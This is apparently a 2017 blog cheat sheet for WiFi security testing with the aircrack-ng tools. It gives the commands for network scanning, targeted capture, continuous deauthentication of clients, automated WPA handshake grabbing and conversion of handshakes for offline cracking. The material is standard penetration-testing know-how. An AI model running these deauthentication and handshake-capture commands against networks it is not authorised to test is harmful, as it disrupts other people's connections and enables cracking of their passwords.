+++
author = "Dan Salmon"
date = 2017-10-10T16:38:19Z
description = ""
draft = false
tags = ["security"]
slug = "wifi-security-testing-cheatsheet"
title = "WiFi Security Testing Cheatsheet"
type = "post"

+++

# Prepare Wireless Card

* **View Network Cards:** 
    *   `iwconfig`
* **Kill Wireless Processes:**
    *   `airmon-ng check kill`

---------
# View Networks

```
airodump-ng wlan0
```

---------

# Capture traffic

```
airodump-ng --bssid 04:A1:51:9F:98:BB --wps --write ISSO-WPA2 --channel 6 wlan0
```

where:

<pre>
--bssid   - MAC of router
--wps     - Output WPS information, may be able to try Reaver
--write   - File name to write to. No extension
--channel - Statically set a channel. Don't need to unless de-authing
wlan0     - Wireless interface	
</pre>

----------------------------

# Deauth - Do while capturing

```
aireplay-ng --deauth 0 -a 04:A1:51:9F:11:11 -c E0:AC:CB:DA:1B:1B wlan0
```

where:
<pre>
0           - Continuously send deauth packets
-a          - BSSID of router (from airodump)
-c          - STATION of client (From airodump. Not necessary, but preferred)
wlan0       - Interface
--deauth     - Which aireplay attack to launch
[0|64 ACKs] - How many acknowledgements from AP|client. More=better especially for AP count
</pre>

------------

# Automating de-auth attack/handshake grab

```
besside-ng -W -c 6 -b 00:00:11:22:33:44 wlan0
```


where:

<pre>
-W    - WPA networks only
-c    - channel lock
-b    - BSSID of AP
wlan0 - interface
</pre>

- Sort of experimental, will probably get errors
- Usually grabs handshake in under 1 minutes, saves to wpa.cap and wep.cap
- Need to see at least (Know 1 clients), otherwise nothing to deauth

-------

# Seperate out individual caps from besside-ng output

```
pyrit -r wpa.cap -o mytargetnetwork.cap -e mytarget strip
```

where:

<pre>
-r - Input file to look at created by besside-ng
-o - Output file to create
-e - ESSID of network to filter by (alternatively, -b with BSSID of network)
</pre>

---------

# Convert .cap with handshake to .hccap

```
aircrack-ng -J network network.cap
```

* Aircrack already adds .hccap extension to file